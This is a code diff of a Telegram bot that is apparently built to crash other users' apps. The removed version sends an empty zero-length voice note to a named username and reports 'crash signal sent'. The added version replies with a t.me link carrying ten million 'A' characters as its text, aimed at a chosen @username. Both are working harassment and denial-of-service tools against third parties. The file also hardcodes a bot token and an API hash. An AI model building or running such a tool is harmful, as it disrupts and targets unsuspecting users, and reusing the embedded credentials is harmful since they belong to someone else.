@@ -1,27 +1,21 @@
-from telethon import TelegramClient, events
-import asyncio
+from telegram import Update
+from telegram.ext import Application, MessageHandler, filters, ContextTypes
 
-api_id = 37131412
-api_hash = 'b4d6fbf9fbe52b119320daeabb6ccd4'
-bot_token = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'
+TOKEN = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'
 
-client = TelegramClient('crash_bot', api_id, api_hash)
+async def handle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    if text and text.startswith('@'):
+        user = text.split()[0].lstrip('@')
+        link = f'https://t.me/{user}?text={"A"*10000000}'
+        await update.message.reply_text(link)
+    else:
+        await update.message.reply_text('Отправь @username')
 
-@client.on(events.NewMessage)
-async def handler(event):
-    text = event.raw_text
-    if not text.startswith('@'):
-        return
-    username = text.split()[0].lstrip('@')
-    try:
-        user = await client.get_entity(username)
-        await client.send_file(user, b'', voice_note=True, duration=0)
-        await event.reply(f'Краш-сигнал отправлен @{username}')
-    except Exception as e:
-        await event.reply(f'Ошибка: {e}')
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
+    app.run_polling()
 
-async def main():
-    await client.start(bot_token=bot_token)
-    await client.run_until_disconnected()
-
-asyncio.run(main())
+if __name__ == '__main__':
+    main()
